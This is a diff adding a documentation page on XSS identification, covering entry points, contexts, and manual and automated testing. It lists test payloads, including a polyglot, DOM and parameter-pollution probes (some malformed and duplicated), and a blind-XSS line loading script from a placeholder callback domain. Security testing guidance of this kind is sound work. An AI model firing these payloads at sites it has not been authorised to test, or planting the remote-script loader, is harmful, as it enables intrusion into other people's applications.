@@ -1,0 +1,161 @@
+---
+title: XSS Identification Techniques
+description: Methods and approaches for discovering Cross-Site Scripting vulnerabilities in web applications
+---
+
+# XSS Identification Techniques
+
+This guide covers methodical approaches to identifying Cross-Site Scripting (XSS) vulnerabilities in web applications. Effective identification is the first step in securing applications against these common but dangerous vulnerabilities.
+
+## Understanding XSS Entry Points
+
+XSS vulnerabilities occur when applications include untrusted data in web pages without proper validation or escaping. Common entry points include:
+
+### User Input Fields
+
+- **Form fields**: Text inputs, textareas, hidden fields
+- **URL parameters**: Query strings, path parameters
+- **HTTP headers**: Referer, User-Agent, Cookie
+- **File uploads**: Especially those that allow HTML or SVG content
+
+### Context Awareness
+
+The effectiveness of XSS identification depends on understanding the context where user input is reflected:
+
+- **HTML context**: Between HTML tags or attributes
+- **JavaScript context**: Within script blocks or event handlers
+- **CSS context**: Within style attributes or style tags
+- **URL context**: In href, src, or other URL attributes
+- **DOM context**: Client-side JavaScript processing
+
+## Manual Testing Techniques
+
+### Basic Payload Testing
+
+Start with simple, non-malicious payloads to identify reflection points:
+
+```html
+<test>
+';alert(1);'
+"><script>alert(1)</script>
+```
+
+### Context-Specific Testing
+
+Tailor your payloads to the specific context:
+
+**HTML Context**:
+```html
+\<img src="x" onerror="alert(1)"\>
+```
+
+**JavaScript Context**:
+```javascript
+';alert(1);//
+```
+
+**Attribute Context**:
+```html
+" onmouseover="alert(1)"
+```
+
+### DOM-Based XSS Testing
+
+For DOM-based XSS, focus on client-side processing:
+
+1. Identify sources (user-controllable inputs)
+2. Trace data flow to sinks (dangerous JavaScript functions)
+3. Test with payloads targeting specific sinks:
+
+```javascript
+location.hash = "#\<img src=\"x\" onerror=\"alert(1)\"\>"
+```
+
+## Automated Testing Approaches
+
+### Scanner-Based Testing
+
+Use specialized tools to automate discovery:
+
+- **Web Application Scanners**: OWASP ZAP, Burp Suite
+- **XSS-Specific Tools**: XSStrike, XSSer, XSS Hunter
+
+### Fuzzing Techniques
+
+Systematically test variations of payloads:
+
+1. **Character set variations**: Testing different encoding schemes
+2. **Tag variations**: Using different HTML tags and events
+3. **Protocol variations**: javascript:, data:, vbscript: protocols
+
+## Advanced Identification Methods
+
+### Blind XSS Detection
+
+Identify XSS vulnerabilities that may not be immediately visible:
+
+1. Use payloads that call back to an external server
+2. Deploy in areas where input might be viewed by others (admin panels, logs)
+
+```html
+\<script src="https://your-callback-domain.com/xss.js"\>\</script\>
+```
+
+### Polyglot XSS Payloads
+
+Use payloads designed to work across multiple contexts:
+
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=\"alert()\" )//%0D%0A%0d%0a//\</stYle/\</titLe/\</teXtarEa/\</scRipt/--!\>\x3csVg/\<sVg/oNloAd=\"alert()\"///\>\x3e
+```
+
+### Parameter Pollution
+
+Test for XSS via parameter duplication:
+
+```html
+https://example.com/?param"safe"&param"\<script\>alert(1)\</script\>"
+https://example.com/?param"safe"&param"\<script\>alert(1)\</script\>"
+```
+
+## Systematic Testing Methodology
+
+### Reconnaissance Phase
+
+1. **Map the application**: Identify all user input points
+2. **Understand technologies**: Determine frameworks and libraries in use
+3. **Review client-side code**: Analyze JavaScript for potential sinks
+
+### Testing Phase
+
+1. **Input reflection testing**: Determine where and how input is reflected
+2. **Context analysis**: Identify the context of each reflection point
+3. **Payload crafting**: Develop context-specific test payloads
+4. **Filter detection**: Identify any filtering or sanitization in place
+
+### Verification Phase
+
+1. **Proof-of-concept**: Develop a non-destructive payload that proves the vulnerability
+2. **Impact assessment**: Determine the potential impact of the vulnerability
+3. **Documentation**: Record findings with clear reproduction steps
+
+## Tools and Resources
+
+### Essential Tools
+
+- **Proxy tools**: Burp Suite, OWASP ZAP
+- **Browser extensions**: XSS Me, DOM Inspector
+- **Payload collections**: XSS Payload List, PayloadsAllTheThings
+
+### Testing Checklists
+
+- **Input vectors**: Forms, URLs, cookies, headers
+- **Output contexts**: HTML, JS, CSS, attributes
+- **Encoding variations**: URL, HTML, JavaScript, Base64
+
+## Next Steps
+
+After identifying XSS vulnerabilities, explore:
+
+- [Evasion Techniques](/docs/xss/attack-techniques/evasion-techniques) - Learn how to bypass XSS filters
+- [Exploitation Strategies](/docs/xss/attack-techniques/exploitation-strategies) - Understand how to demonstrate impact
